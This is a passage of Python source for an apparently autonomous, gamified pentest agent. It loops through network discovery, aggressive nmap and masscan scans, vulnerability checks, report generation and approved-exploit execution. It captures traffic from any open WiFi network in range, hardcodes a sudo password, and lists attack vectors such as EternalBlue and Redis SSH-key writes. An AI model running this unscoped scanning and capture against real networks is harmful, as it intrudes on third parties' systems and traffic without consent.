            {"text": "Show discovered devices", "category": "recon", "icon": "list"},
            {"text": "Generate network map", "category": "recon", "icon": "map"},
            {"text": "Check system health", "category": "system", "icon": "heart"},
            {"text": "List all agents", "category": "system", "icon": "users"},
        ])

        # Context-aware suggestions based on state
        if self._stats["devices_found"] > 0:
            suggestions.extend([
                {"text": "Pentest all discovered devices", "category": "pentest", "icon": "crosshair"},
                {"text": "Enumerate services on all targets", "category": "recon", "icon": "scan"},
                {"text": "Search for known CVEs", "category": "vuln", "icon": "bug"},
            ])

        if self._stats["vulns_found"] > 0:
            suggestions.extend([
                {"text": "Prioritize exploits by severity", "category": "exploit", "icon": "fire"},
                {"text": "Generate vulnerability report", "category": "report", "icon": "file"},
                {"text": "Show pending authorizations", "category": "tamagotchi", "icon": "shield"},
            ])

        pending = sum(1 for n in self._notifications if n.needs_auth and n.auth_status == AuthStatus.PENDING)
        if pending > 0:
            suggestions.append(
                {"text": f"Review {pending} pending authorization(s)", "category": "tamagotchi", "icon": "alert"}
            )

        # Knowledge-based suggestions
        knowledge_stats = self.get_knowledge_stats()
        if knowledge_stats:
            suggestions.append(
                {"text": "What do we know about [target]?", "category": "knowledge", "icon": "brain"}
            )

        return suggestions

    # ── Main Autonomous Loop ──────────────────────────────────

    async def start(self, scan_interval: int = 600):
        """Start the autonomous loop."""
        if self._running:
            return
        self._running = True
        self._paused = False
        self._state = TamaState.IDLE
        logger.info(f"Tamagotchi engine started (interval: {scan_interval}s)")
        self._loop_task = asyncio.create_task(self._autonomous_loop(scan_interval))

    async def stop(self):
        """Stop the autonomous loop."""
        self._running = False
        self._paused = False
        self._state = TamaState.SLEEPING
        if self._loop_task:
            self._loop_task.cancel()
            try:
                await self._loop_task
            except asyncio.CancelledError:
                pass
        if self._scan_task and not self._scan_task.done():
            self._scan_task.cancel()
            try:
                await self._scan_task
            except asyncio.CancelledError:
                pass
        await self._resume_ollama()
        self.save_state()
        logger.info("Tamagotchi engine stopped")

    def pause(self):
        """Pause the autonomous loop."""
        if self._running and not self._paused:
            self._paused = True
            self._state = TamaState.SLEEPING
            self._think("Paused by user")
            logger.info("Tamagotchi engine paused")

    def resume(self):
        """Resume the autonomous loop."""
        if self._running and self._paused:
            self._paused = False
            self._state = TamaState.IDLE
            self._think("Resumed by user")
            logger.info("Tamagotchi engine resumed")

    def _think(self, thought: str):
        """Record a thought and log it."""
        self._current_thought = thought
        self._thinking_log.append({
            "thought": thought,
            "state": self._state.value,
            "timestamp": time.time(),
        })
        if len(self._thinking_log) > 100:
            self._thinking_log = self._thinking_log[-100:]
        logger.info(f"[TAMA THINK] {thought}")
        try:
            from avatar.engine import get_avatar_engine
            av = get_avatar_engine()
            state_map = {
                "idle": "idle", "scanning": "thinking", "mapping": "analyzing",
                "cracking": "thinking", "exploiting": "alert", "alert": "alert",
            }
            av_state = state_map.get(self._state.value, "thinking")
            av.set_state(av_state, animate=True)
            av.set_text_display(thought[:120])
        except Exception:
            pass

    async def _autonomous_loop(self, interval: int):
        """Main autonomous loop — FAST and AGGRESSIVE.
        Tamagotchi uses MAX speed scans. Jetson anonymity handled separately.
        1. Discover all networks (FAST)
        2. WiFi recon + handshakes
        3. Host discovery (FAST)
        4. Service detection on each host (FAST)
        5. Vulnerability analysis
        6. OS detection (FAST)
        7. Full port scan on interesting hosts
        8. Build topology
        9. Execute authorized exploits
        10. Generate report + index everything
        """
        while self._running:
            try:
                while self._paused and self._running:
                    await asyncio.sleep(1)
                if not self._running:
                    break

                from agents.sentient import get_sentient_engine
                sentient = get_sentient_engine()

                # ── Phase 1: Discover Networks (FAST) ──
                self._current_phase = "network_discovery"
                self._state = TamaState.SCANNING
                cycle_start = time.time()
                self._think("Phase 1: Discovering all networks [FAST]...")
                self._phase_progress = {"phase": "network_discovery", "progress": 0}

                await sentient._detect_our_interfaces()
                self._our_ip = sentient._our_ip
                self._our_mac = sentient._our_mac
                self._my_interfaces = dict(sentient._my_interfaces)
                self._wifi_interface = self._PRIMARY_WIFI
                networks = await sentient._detect_local_networks()
                self._phase_progress = {"phase": "network_discovery", "networks": len(networks), "progress": 100}

                for cidr in networks:
                    if cidr not in self._networks:
                        self._networks[cidr] = Network(cidr=cidr)
                        self._think(f"Found network: {cidr}")
                        self.award_xp("new_network_mapped", detail=cidr)

                self._stats["networks_analyzed"] = len(networks)
                self.log_knowledge("network_discovery", "all_networks", {
                    "networks": networks,
                    "our_ip": self._our_ip,
                }, source="fast_scan")

                # ── Phase 2: WiFi Recon + Handshakes ──
                self._current_phase = "wifi_recon"
                self._think("Phase 2: WiFi reconnaissance...")
                self._phase_progress = {"phase": "wifi_recon", "progress": 0}

                wifi_aps = await sentient._scan_wifi()
                self._phase_progress = {"phase": "wifi_recon", "aps_found": len(wifi_aps), "progress": 50}

                open_aps = [a for a in wifi_aps if a.encryption == "off"]
                weak_aps = [a for a in wifi_aps if a.encryption == "on" and a.signal > -60]

                if open_aps:
                    self._stats["open_networks_found"] += len(open_aps)
                    for ap in open_aps:
                        self._think(f"OPEN NETWORK: {ap.ssid} ({ap.bssid}) — no encryption!")
                        self.create_notification(
                            NotificationType.ALERT,
                            f"Open WiFi: {ap.ssid}",
                            f"BSSID: {ap.bssid}, Signal: {ap.signal} dBm — NO ENCRYPTION",
                            severity="high",
                        )
                        self.award_xp("wifi_ap_found", detail=f"OPEN: {ap.ssid}")

                for ap in open_aps[:3]:
                    self._think(f"Capturing traffic from open network: {ap.ssid}...")
                    await self._capture_wifi_traffic(ap)

                for ap in weak_aps[:2]:
                    self._think(f"Testing weak network: {ap.ssid}...")
                    await self._test_wifi_security(ap)

                # Index all WiFi findings
                self.log_knowledge("wifi_recon", "all_aps", {
                    "total": len(wifi_aps),
                    "open": len(open_aps),
                    "strong": len(weak_aps),
                    "aps": [{"ssid": a.ssid, "bssid": a.bssid, "signal": a.signal, "enc": a.encryption} for a in wifi_aps],
                }, source="wifi_recon")

                # Copy WiFi APs to self and build incremental topology
                for ap in wifi_aps:
                    self._wifi_aps[ap.bssid] = ap
                self._build_topology()

                self._phase_progress = {"phase": "wifi_recon", "progress": 100}

                # ── Phase 3: Host Discovery (FAST) ──
                self._current_phase = "host_discovery"
                self._think(f"Phase 3: Fast host discovery on {len(networks)} network(s)...")
                all_hosts = []
                for i, cidr in enumerate(networks):
                    self._phase_progress = {"phase": "host_discovery", "network": cidr, "progress": int((i/len(networks))*100)}
                    hosts = await self._fast_discover(cidr)
                    all_hosts.extend(hosts)
                    self._think(f"Found {len(hosts)} hosts on {cidr}")

                self._stats["scans_run"] += 1
                self._streaks["scans"] = self._streaks.get("scans", 0) + 1
                self.award_xp("scan_complete", detail=f"{len(all_hosts)} hosts across {len(networks)} networks")

                # ── Phase 4: Service Detection (FAST, one host at a time) ──
                self._current_phase = "service_analysis"
                self._think(f"Phase 4: Fast service analysis on {len(all_hosts)} hosts...")
                new_devices = 0
                for i, host in enumerate(all_hosts):
                    if self._paused:
                        self._think("Paused during service analysis")
                        while self._paused and self._running:
                            await asyncio.sleep(1)

                    ip = host["ip"]
                    if ip in self._devices:
                        self._devices[ip].last_seen = time.time()
                        continue

                    self._phase_progress = {"phase": "service_analysis", "host": ip, "progress": int((i/len(all_hosts))*100), "total": len(all_hosts)}
                    self._think(f"Analysing {ip} ({i+1}/{len(all_hosts)})...")

                    services = await self._fast_service_scan(ip)
                    device = Device(
                        ip=ip,
                        hostname=host.get("hostname", ""),
                        services=services,
                    )
                    device.device_type = sentient._classify_device(device)
                    self._devices[ip] = device
                    new_devices += 1
                    self._stats["devices_found"] = len(self._devices)
                    self._build_topology()

                    self.learn_from_device(device.to_dict())

                    self.create_notification(
                        NotificationType.NEW_DEVICE,
                        f"New device: {ip}",
                        f"Hostname: {device.hostname or 'unknown'}, "
                        f"Type: {device.device_type.value}, "
                        f"Services: {len(services)}",
                        target=ip,
                        severity="info",
                    )
                    self.award_xp("device_discovered", detail=f"{ip} ({device.device_type.value})")

                    # Per-host vulnerability analysis
                    await self._analyze_device_vulns(device)

                    # Full port scan on interesting hosts (servers, routers)
                    if device.device_type in (DeviceType.SERVER, DeviceType.ROUTER) or len(services) > 3:
                        self._think(f"Deep port scan on {ip} (interesting host)...")
                        extra_ports = await self._fast_full_port_scan(ip)
                        known_ports = {s.port for s in services}
                        new_ports = [p for p in extra_ports if p not in known_ports]
                        if new_ports:
                            self._think(f"Found {len(new_ports)} additional ports on {ip}: {new_ports[:10]}")
                            # Scan new ports for services
                            for port in new_ports[:10]:
                                svc_stdout = await self._fast_nmap(
                                    f"nmap -sV -T4 -p {port} {ip}", timeout=30
                                )
                                for line in svc_stdout.split("\n"):
                                    if "/tcp" in line and "open" in line:
                                        parts = line.split()
                                        if len(parts) >= 3:
                                            svc_name = parts[2]
                                            svc_ver = " ".join(parts[3:]) if len(parts) > 3 else ""
                                            services.append(Service(port=port, protocol="tcp", name=svc_name, version=svc_ver))

                            self.log_knowledge("deep_port_scan", ip, {
                                "extra_ports": new_ports,
                                "total_ports": len(extra_ports),
                            }, source="fast_scan")
                            self.award_xp("full_port_scan", detail=f"{ip}: {len(extra_ports)} ports found")

                if new_devices > 0:
                    self._streaks["devices"] = self._streaks.get("devices", 0) + new_devices

                # ── Phase 5: OS Detection (FAST) ──
                self._current_phase = "os_detection"
                for host in all_hosts[:10]:
                    ip = host["ip"]
                    if ip in self._devices and not self._devices[ip].os_guess:
                        self._think(f"Detecting OS on {ip}...")
                        os_guess = await self._fast_os_detect(ip)
                        if os_guess:
                            self._devices[ip].os_guess = os_guess
                            self._devices[ip].device_type = sentient._classify_device(self._devices[ip])
                            self.award_xp("os_identified", detail=f"{ip}: {os_guess[:40]}")

                # ── Phase 6: Targeted Vuln Scans on High-Value Targets ──
                self._current_phase = "vuln_scanning"
                self._think("Phase 6: Vulnerability scanning on high-value targets...")
                high_value = []
                for ip, dev in self._devices.items():
                    svc_names = {s.name.lower() for s in dev.services}
                    if any(s in svc_names for s in ["http", "https", "ssh", "ftp", "smb", "mysql", "redis", "telnet"]):
                        high_value.append(ip)

                for ip in high_value[:8]:  # Limit to 8 targets
                    if self._paused:
                        while self._paused and self._running:
                            await asyncio.sleep(1)
                    self._think(f"Vuln scanning {ip}...")
                    vulns = await self._fast_vuln_scan(ip)
                    for v in vulns:
                        if v.get("confirmed"):
                            self._create_vuln_notification(
                                ip, int(v.get("port", 0)), "nmap_vuln", "high",
                                f"Confirmed vulnerability on {ip}:{v.get('port', '?')}"
                            )
                            self.award_xp("vuln_validated", detail=f"{ip}:{v.get('port', '?')} {v.get('name', 'vuln')}")
                            self._stats["vulns_validated"] = self._stats.get("vulns_validated", 0) + 1

                # ── Phase 7: Build Topology ──
                self._current_phase = "topology"
                self._think("Building network topology...")
                self._build_topology()
                self.award_xp("topology_updated", detail=f"{len(self._topology.get('nodes',[]))} nodes, {len(self._topology.get('edges',[]))} edges")

                # ── Phase 8: Execute Authorized Exploits ──
                self._current_phase = "exploitation"
                authorized = [
                    t for t in self._exploit_queue
                    if t.auth_status == AuthStatus.APPROVED and not t.executed
                ]
                if authorized:
                    self._think(f"Executing {len(authorized)} authorized exploit(s)...")
                    self._state = TamaState.EXPLOITING

                # ── Phase 9: Generate Report + Full Index ──
                self._current_phase = "reporting"
                self._think("Generating report and indexing all findings...")
                await self._generate_report()
                await self._index_all_findings()
                self.award_xp("report_generated", detail=f"{self._stats['devices_found']} devices, {self._stats['vulns_found']} vulns")
                self._stats["reports_generated"] = self._stats.get("reports_generated", 0) + 1

                # ── Phase 10: Persist & Idle ──
                self._current_phase = "idle"
                self._state = TamaState.IDLE
                self._stats["cycle_count"] = self._stats.get("cycle_count", 0) + 1
                cycle_elapsed = time.time() - cycle_start
                self._think(f"Cycle complete ({int(cycle_elapsed)}s). {self._stats['devices_found']} devices, {self._stats['vulns_found']} vulns, Level {self._level}.")
                self._phase_progress = {"phase": "idle", "progress": 100}
                await self._index_all_findings()
                self.save_state()

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Tamagotchi loop error: {e}", exc_info=True)
                self._state = TamaState.ALERT
                self._think(f"Error: {e}")

            # Wait between cycles (check for pause)
            for _ in range(interval):
                if self._paused or not self._running:
                    break
                await asyncio.sleep(1)

    # ── Fast Scan Engine (bypasses stealth — MAX speed) ───────

    async def _fast_nmap(self, cmd: str, timeout: float = 120.0) -> str:
        """Run nmap at maximum speed, no stealth. Returns stdout."""
        import shutil as _shutil
        if _shutil.which("sudo") and os.path.exists("/etc/shadow"):
            full_cmd = f"echo jetson | sudo -S {cmd} 2>/dev/null"
        else:
            full_cmd = cmd
        proc = None
        try:
            proc = await asyncio.create_subprocess_shell(
                full_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return stdout.decode("utf-8", errors="replace")
        except asyncio.TimeoutError:
            if proc and proc.returncode is None:
                proc.kill()
                await proc.wait()
            return ""
        except Exception:
            if proc and proc.returncode is None:
                proc.kill()
                await proc.wait()
            return ""

    async def _fast_discover(self, cidr: str) -> List[Dict[str, str]]:
        """Ultra-fast host discovery — nmap -sn -T4, no stealth."""
        self._think(f"Fast discovery on {cidr}...")
        stdout = await self._fast_nmap(f"nmap -sn -T4 --max-rate 10000 {cidr}", timeout=90)

        hosts = []
        current_ip = None
        for line in stdout.split("\n"):
            line = line.strip()
            if "Nmap scan report for" in line:
                parts = line.replace("Nmap scan report for ", "")
                if "(" in parts:
                    hostname = parts.split("(")[0].strip()
                    ip = parts.split("(")[1].rstrip(")")
                else:
                    hostname = ""
                    ip = parts.strip()
                current_ip = ip
                hosts.append({"ip": ip, "hostname": hostname})
            elif "Host is up" in line and current_ip:
                hosts[-1]["up"] = True

        self.log_knowledge("scan_result", f"discovery_{cidr}", {
            "hosts_found": len(hosts),
            "ips": [h["ip"] for h in hosts],
            "command": f"nmap -sn -T4 {cidr}",
        }, source="fast_scan")
        return hosts

    async def _fast_service_scan(self, ip: str) -> List["Service"]:
        """Fast service detection — nmap -sV -T4 on top 10000 ports."""
        stdout = await self._fast_nmap(
            f"nmap -sV -T4 --version-intensity 3 --top-ports 10000 --max-rate 10000 {ip}",
            timeout=120
        )

        services = []
        for line in stdout.split("\n"):
            line = line.strip()
            if "/tcp" in line or "/udp" in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0]
                    port_num = int(port_proto.split("/")[0])
                    protocol = port_proto.split("/")[1]
                    state = parts[1]
                    if state == "open":
                        name = parts[2] if len(parts) > 2 else ""
                        version = " ".join(parts[3:]) if len(parts) > 3 else ""
                        services.append(Service(
                            port=port_num,
                            protocol=protocol,
                            name=name,
                            version=version,
                        ))

        # Index result for LLM
        self.log_knowledge("service_scan", ip, {
            "services": [{"port": s.port, "name": s.name, "version": s.version} for s in services],
            "command": f"nmap -sV -T4 {ip}",
        }, source="fast_scan")
        return services

    async def _fast_vuln_scan(self, target: str, ports: str = "") -> List[Dict[str, Any]]:
        """Fast vulnerability scan — nmap --script vuln -T4."""
        port_flag = f"-p {ports}" if ports else ""
        stdout = await self._fast_nmap(
            f"nmap --script vuln -T4 --max-rate 5000 {port_flag} --script-timeout 15 {target}",
            timeout=300
        )

        vulns = []
        current_vuln = {}
        for line in stdout.split("\n"):
            line = line.strip()
            if line.startswith("|"):
                vuln_text = line.lstrip("| ").strip()
                if vuln_text:
                    if current_vuln:
                        current_vuln.setdefault("details", []).append(vuln_text)
            elif "VULNERABLE" in line or "vulnerable" in line:
                current_vuln["confirmed"] = True
            elif "/tcp" in line and ("open" in line):
                if current_vuln:
                    vulns.append(current_vuln)
                current_vuln = {"port": line.split("/")[0], "line": line}

        if current_vuln:
            vulns.append(current_vuln)

        self.log_knowledge("vuln_scan", target, {
            "vulns_found": len(vulns),
            "vulns": vulns,
            "command": f"nmap --script vuln -T4 {target}",
        }, source="fast_scan")
        return vulns

    async def _fast_os_detect(self, ip: str) -> str:
        """Fast OS detection — nmap -O -T4."""
        stdout = await self._fast_nmap(
            f"nmap -O --osscan-guess -T4 {ip}", timeout=60
        )
        for line in stdout.split("\n"):
            if "OS details" in line or "Running:" in line:
                result = line.split(":", 1)[-1].strip() if ":" in line else line.strip()
                self.log_knowledge("os_detection", ip, {
                    "os": result,
                    "command": f"nmap -O -T4 {ip}",
                }, source="fast_scan")
                return result
        return ""

    async def _fast_full_port_scan(self, ip: str) -> List[int]:
        """Fast full port scan — masscan 1-65535 at 10000 pps."""
        stdout = await self._fast_nmap(
            f"masscan -p1-65535 --rate=10000 --open -oG - {ip}",
            timeout=90
        )
        open_ports = []
        for line in stdout.split("\n"):
            line = line.strip()
            if "Ports:" in line:
                import re
                ports_match = re.findall(r'(\d+)/open', line)
                open_ports = [int(p) for p in ports_match]
        if not open_ports:
            stdout2 = await self._fast_nmap(
                f"nmap -p- -T4 --max-rate 5000 --open {ip}", timeout=90
            )
            for line in stdout2.split("\n"):
                line = line.strip()
                if "/tcp" in line and "open" in line:
                    port = int(line.split("/")[0])
                    open_ports.append(port)
        return open_ports

    # ── WiFi Traffic Capture ─────────────────────────────────

    async def _capture_wifi_traffic(self, ap):
        """Capture traffic from an open WiFi network (no auth needed — passive)."""
        try:
            iface = "wlxc4e984dfb30f"
            ssid_safe = (ap.ssid or "unknown").replace(" ", "_").replace("/", "_")[:20]
            outfile = f"/tmp/wifi_capture_{ssid_safe}_{int(time.time())}"
            # Passive capture — just listen, no injection
            cmd = (
                f"echo jetson | sudo -S timeout 30 tcpdump -i {iface} "
                f"-w {outfile}.pcap -c 500 "
                f"not arp and not multicast 2>/dev/null"
            )
            self._think(f"Passive capture on {ap.ssid or ap.bssid}...")
            proc = await asyncio.create_subprocess_shell(
                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            try:
                await asyncio.wait_for(proc.communicate(), timeout=35)
            except asyncio.TimeoutError:
                if proc.returncode is None:
                    proc.kill()
                    await proc.wait()

            # Check if we got a file
            import os
            pcap = f"{outfile}.pcap"
            if os.path.exists(pcap) and os.path.getsize(pcap) > 0:
                self._think(f"Captured traffic from {ap.ssid or ap.bssid}")
                self.log_knowledge("wifi_capture", ap.bssid, {
                    "ssid": ap.ssid, "signal": ap.signal, "pcap": pcap,
                    "size": os.path.getsize(pcap),
                }, source="passive_capture")
                self.award_xp("wifi_traffic_captured", detail=f"{ap.ssid}")
            else:
                self._think(f"No traffic captured from {ap.ssid or ap.bssid}")
        except Exception as e:
            logger.warning(f"WiFi capture failed: {e}")

    async def _test_wifi_security(self, ap):
        """Test WiFi network security (passive — check encryption, not crack)."""
        try:
            self._think(f"Testing security of {ap.ssid or ap.bssid}...")
            # Log encryption info
            self.log_knowledge("wifi_security", ap.bssid, {
                "ssid": ap.ssid,
                "encryption": ap.encryption,
                "signal": ap.signal,
                "channel": ap.channel,
                "risk": "open" if ap.encryption == "off" else "encrypted",
            }, source="security_test")

            if ap.encryption == "off":
                self._think(f"UNSECURED: {ap.ssid} — no encryption!")
                self._create_vuln_notification(ap.bssid.replace(":", ""), 0, "open_wifi", "high",
                    f"Open WiFi network: {ap.ssid} ({ap.bssid}) — no encryption, all traffic visible")
            else:
                self._think(f"Network {ap.ssid} uses {ap.encryption} encryption")
        except Exception as e:
            logger.warning(f"WiFi security test failed: {e}")

    # ── Per-Device Vulnerability Analysis ───────────────────

    async def _analyze_device_vulns(self, device):
        """Analyze a single device for vulnerabilities."""
        ip = device.ip
        hostname = device.hostname or ""
        dev_type = device.device_type.value
        vulns_on_device = 0

        if len(device.services) > 3:
            self.award_xp("service_enum_deep", detail=f"{ip}: {len(device.services)} services")

        for svc in device.services:
            port = svc.port
            name = svc.name.lower() if svc.name else ""
            version = svc.version or ""
            vuln_found = False
            severity = "info"

            # Telnet (plaintext)
            if name == "telnet" or port == 23:
                self._think(f"⚠️ Telnet on {ip}:{port} — plaintext, sniffable")
                self._create_vuln_notification(ip, port, "telnet_exposure", "high",
                    f"Telnet on {ip}:{port} — credentials in plaintext")
                vuln_found = True
                severity = "high"

            # FTP
            elif name == "ftp" or port == 21:
                self._think(f"FTP on {ip}:{port} — checking for anon access...")
                self._create_vuln_notification(ip, port, "ftp_anon", "medium",
                    f"FTP on {ip}:{port} — check anonymous login")
                self.award_xp("service_exploited", detail=f"FTP on {ip}:{port}")
                vuln_found = True
                severity = "medium"

            # SSH
            elif name == "ssh" or port == 22:
                if version and "OpenSSH" in version:
                    try:
                        ver_num = float(version.split("p")[0].replace("OpenSSH_", ""))
                        if ver_num < 7.0:
                            self._think(f"⚠️ Outdated SSH on {ip}: {version}")
                            self._create_vuln_notification(ip, port, "outdated_ssh", "medium",
                                f"Outdated OpenSSH ({version}) on {ip}:{port}")
                            vuln_found = True
                            severity = "medium"
                    except (ValueError, IndexError):
                        pass

            # HTTP/HTTPS
            elif name in ("http", "https"):
                self.log_knowledge("web_service", f"{ip}:{port}",
                    {"service": name, "version": version, "hostname": hostname},
                    source="analysis")

            # SMB
            elif name in ("microsoft-ds", "netbios-ssn") or port in (445, 139):
                self._think(f"⚠️ SMB on {ip}:{port} — exploit target")
                self._create_vuln_notification(ip, port, "smb_exposed", "high",
                    f"SMB on {ip}:{port} — brute force or EternalBlue possible")
                self.award_xp("service_exploited", detail=f"SMB on {ip}:{port}")
                vuln_found = True
                severity = "high"

            # Databases
            elif name in ("mysql", "postgresql", "ms-sql") or port in (3306, 5432, 1433):
                self._think(f"⚠️ Database exposed on {ip}:{port} ({name})")
                self._create_vuln_notification(ip, port, "db_exposed", "high",
                    f"Database {name} on {ip}:{port} — should not be accessible")
                vuln_found = True
                severity = "high"

            # Redis
            elif name == "redis" or port == 6379:
                self._think(f"⚠️ Redis on {ip}:{port} — possible unauth access")
                self._create_vuln_notification(ip, port, "redis_exposed", "high",
                    f"Redis on {ip}:{port} — may allow unauthenticated access")
                self.award_xp("service_exploited", detail=f"Redis on {ip}:{port}")
                vuln_found = True
                severity = "high"

            # RDP
            elif name == "rdp" or port == 3389:
                self._think(f"RDP on {ip}:{port} — brute force target")
                self._create_vuln_notification(ip, port, "rdp_exposed", "medium",
                    f"RDP on {ip}:{port} — brute force or BlueKeep check")
                vuln_found = True
                severity = "medium"

            # SNMP
            elif name == "snmp" or port in (161, 162):
                self._think(f"⚠️ SNMP on {ip}:{port} — info leak possible")
                self._create_vuln_notification(ip, port, "snmp_exposed", "medium",
                    f"SNMP on {ip}:{port} — community strings may be default")
                self.award_xp("snmp_community_found", detail=f"SNMP on {ip}:{port}")
                vuln_found = True
                severity = "medium"

            # VNC
            elif name == "vnc" or port == 5900:
                self._think(f"⚠️ VNC on {ip}:{port} — unencrypted remote desktop")
                self._create_vuln_notification(ip, port, "vnc_exposed", "medium",
                    f"VNC on {ip}:{port} — unencrypted remote access")
                vuln_found = True
                severity = "medium"

            # Log knowledge for all services
            self.log_knowledge("service_analysis", f"{ip}:{port}",
                {"service": name, "version": version, "vuln": vuln_found, "severity": severity},
                source="tamagotchi_analysis")

            if vuln_found:
                self._stats["vulns_found"] += 1
                vulns_on_device += 1
                self.award_xp("vuln_found", detail=f"{ip}:{port} ({name})")

        if vulns_on_device == 0:
            self._think(f"Device {ip} ({hostname or dev_type}) — {len(device.services)} services, clean")

    # ── Full Knowledge Indexing ─────────────────────────────

    async def _index_all_findings(self):
        """Index ALL scan/attack results into knowledge for LLM access."""
        try:
            from agents.sentient import get_sentient_engine
            sentient = get_sentient_engine()

            # Index all devices with full detail
            for ip, dev in self._devices.items():
                svc_list = [{"port": s.port, "name": s.name, "version": s.version} for s in dev.services]
                self.log_knowledge("device_full", ip, {
                    "ip": ip,
                    "hostname": dev.hostname,
                    "mac": dev.mac,
                    "os": dev.os_guess,
                    "type": dev.device_type.value,
                    "services": svc_list,
                    "vulns": dev.vulnerabilities,
                    "first_seen": dev.first_seen,
                    "last_seen": dev.last_seen,
                }, source="index")

                # Index attack surface
                attack_surface = []
                for s in dev.services:
                    if s.name.lower() in ("ssh", "telnet", "ftp", "http", "https", "smb", "rdp", "vnc", "mysql", "redis", "snmp"):
                        attack_surface.append({
                            "port": s.port,
                            "service": s.name,
                            "version": s.version,
                            "attack_vector": self._get_attack_vector(s.name, s.version),
                        })
                if attack_surface:
                    self.log_knowledge("attack_surface", ip, {
                        "targets": attack_surface,
                        "exploitable": any(a["attack_vector"] for a in attack_surface),
                    }, source="index")

            # Index all WiFi APs
            for bssid, ap in self._wifi_aps.items():
                self.log_knowledge("wifi_network", bssid, {
                    "ssid": ap.ssid,
                    "bssid": bssid,
                    "channel": ap.channel,
                    "signal": ap.signal,
                    "encryption": ap.encryption,
                    "risk": "open" if ap.encryption == "off" else "wep" if "wep" in ap.encryption.lower() else "wpa",
                }, source="index")

            # Index all notifications/vulns
            for n in self._notifications:
                if n.type in (NotificationType.VULN_FOUND, NotificationType.ALERT):
                    self.log_knowledge("vulnerability", n.target, {
                        "title": n.title,
                        "message": n.message,
                        "severity": n.severity,
                        "needs_auth": n.needs_auth,
                        "created_at": n.created_at,
                    }, source="index")

            # Index topology
            topology = self.get_topology()
            self.log_knowledge("topology", "current", {
                "nodes": len(topology.get("nodes", [])),
                "edges": len(topology.get("edges", [])),
                "networks": self.get_networks(),
            }, source="index")

            self._think(f"Indexed {len(self._devices)} devices, {len(self._wifi_aps)} APs into knowledge")

        except Exception as e:
            logger.error(f"Knowledge indexing failed: {e}")

    def _get_attack_vector(self, service: str, version: str) -> str:
        """Get known attack vector for a service."""
        vectors = {
            "ssh": "brute_force, key_auth, cve_check",
            "telnet": "credential_sniff, brute_force, default_creds",
            "ftp": "anonymous_login, brute_force, bounce_attack",
            "http": "web_vuln, sqli, xss, rce, dir_traversal",
            "https": "web_vuln, ssl_check, cert_enum",
            "smb": "eternalblue, relay_attack, share_enum, brute_force",
            "rdp": "bluekeep, brute_force, credential_stuff",
            "vnc": "brute_force, auth_bypass",
            "mysql": "brute_force, udf_privesc, file_read",
            "redis": "unauth_access, ssh_key_write, crontab_write",
            "snmp": "community_string_enum, snmpwalk",
        }
        svc_lower = service.lower()
        for key, val in vectors.items():
            if key in svc_lower:
                return val
        return ""

    # ── Report Generation ───────────────────────────────────

    async def _generate_report(self):
        """Generate a summary report of all findings."""
        try:
            devices = self.get_devices()
            wifi_aps = self.get_wifi_aps()
            networks = self.get_networks()
            topology = self.get_topology()

            report = {
                "timestamp": time.time(),
                "summary": {
                    "total_devices": len(devices),
                    "total_wifi_aps": len(wifi_aps),
                    "total_networks": len(networks),
                    "vulns_found": self._stats["vulns_found"],
                    "open_networks": self._stats.get("open_networks_found", 0),
                    "handshakes": self._stats.get("handshakes_captured", 0),
                },
                "devices": [],
                "wifi_networks": [],
                "vulnerabilities": [],
                "topology": topology,
            }

            for dev in devices:
                dev_report = {
                    "ip": dev.get("ip"),
                    "hostname": dev.get("hostname", ""),
                    "type": dev.get("type", "unknown"),
                    "os": dev.get("os_guess", ""),
                    "services": [
                        {"port": s.get("port"), "name": s.get("name"), "version": s.get("version")}
                        for s in dev.get("services", [])
                    ],
                }
                report["devices"].append(dev_report)

            for ap in wifi_aps:
                report["wifi_networks"].append({
                    "ssid": ap.get("ssid"),
                    "bssid": ap.get("bssid"),
                    "signal": ap.get("signal"),
                    "encryption": ap.get("encryption"),
                    "channel": ap.get("channel"),
                })

            # Collect all vulns from notifications
            for n in self._notifications:
                if n.type == NotificationType.VULN_FOUND:
                    report["vulnerabilities"].append({
                        "target": n.target,
                        "title": n.title,
                        "message": n.message,
                        "severity": n.severity,
                    })

            self._reports.append(report)
            if len(self._reports) > 20:
                self._reports = self._reports[-20:]

            # Save report to disk
            report_file = self._data_dir / f"report_{int(time.time())}.json"
            try:
                with open(report_file, 'w') as f:
                    json.dump(report, f, indent=2)
                self._think(f"Report saved: {report_file.name}")
            except Exception as e:
                logger.error(f"Failed to save report: {e}")

        except Exception as e:
            logger.error(f"Report generation failed: {e}")

    # ── Data Access ───────────────────────────────────────────

    def get_notifications(
        self,
        status: Optional[AuthStatus] = None,
        limit: int = 50,
    ) -> List[Dict[str, Any]]:
        """Get notifications, optionally filtered by auth status."""
        notifs = self._notifications
        if status:
            notifs = [n for n in notifs if n.auth_status == status]
        return [n.to_dict() for n in notifs[-limit:]]

    def get_exploit_queue(self) -> List[Dict[str, Any]]:
        """Get prioritized exploit queue."""
        return [t.to_dict() for t in self.prioritize_exploits()]

    def get_crack_sessions(self) -> List[Dict[str, Any]]:
        """Get all cracking sessions."""
        return [c.to_dict() for c in self._crack_sessions]

    def clear_old_notifications(self, max_age_hours: int = 24):
        """Clear notifications older than max_age hours."""
        cutoff = time.time() - (max_age_hours * 3600)
        self._notifications = [
            n for n in self._notifications
            if n.created_at > cutoff
        ]

    # ── Event Log & Gamification Data ────────────────────────

    def get_event_log(self, limit: int = 100, event_type: Optional[str] = None) -> List[Dict]:
        """Get recent events (XP gains, achievements, penalties, level ups)."""
        log = self._event_log
        if event_type:
            log = [e for e in log if e.get("type") == event_type]
        return log[-limit:]

    def get_mistakes(self, limit: int = 50) -> List[Dict]:
        """Get recent mistakes for learning review."""
        return self._mistakes[-limit:]

    def get_gamification(self) -> Dict[str, Any]:
        """Get full gamification status."""
        return {
            "xp": self._xp,
            "level": self._level,
            "level_name": self._get_level_name(),
            "total_xp": self._total_xp,
            "xp_to_next": self._xp_to_next_level(),
            "xp_progress": round(self._xp_progress(), 3),
            "next_level_name": self.LEVEL_NAMES[min(self._level, len(self.LEVEL_NAMES)-1)],
            "achievements": [
                {**self.ACHIEVEMENTS[k], "key": k}
                for k in self._achievements
            ],
            "achievements_available": len(self.ACHIEVEMENTS),
            "streaks": self._streaks,
            "mistakes": self.get_learning_data(),
            "recent_events": self.get_event_log(20),
            "stats": self._stats,
